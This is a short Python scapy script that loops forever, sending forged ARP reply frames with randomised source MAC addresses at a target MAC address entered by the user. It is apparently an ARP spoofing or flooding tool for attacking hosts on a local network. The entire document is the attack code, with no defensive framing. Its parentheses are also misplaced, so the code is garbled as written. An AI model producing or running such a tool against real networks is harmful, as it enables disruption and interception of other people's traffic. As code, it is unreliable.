from scapy.all import *

while 1:
    sendp(Ether(src=RandMAC(),dst=input("[*] Enter The Target's Mac Address")/ARP(op=2, psrc="0.0.0.0", hwdst=input("[*] Enter Your Mac Address"))/Padding(load="X"*18)))